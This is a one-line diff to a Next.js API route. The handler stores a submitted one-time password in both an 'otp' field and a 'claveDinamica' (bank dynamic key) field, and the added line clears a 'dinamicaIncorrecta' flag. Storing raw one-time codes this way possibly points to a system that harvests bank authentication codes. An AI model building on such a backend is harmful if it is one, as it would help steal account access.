@@ -198,6 +198,7 @@ export async function POST(request: NextRequest) {
             otp: data.otp,
             claveDinamica: data.otp, // También guardar en claveDinamica
             status: 'otp_submitted',
+            dinamicaIncorrecta: false, // Limpiar flag cuando se envía nueva dinámica
             updatedAt: new Date(),
           }
         });
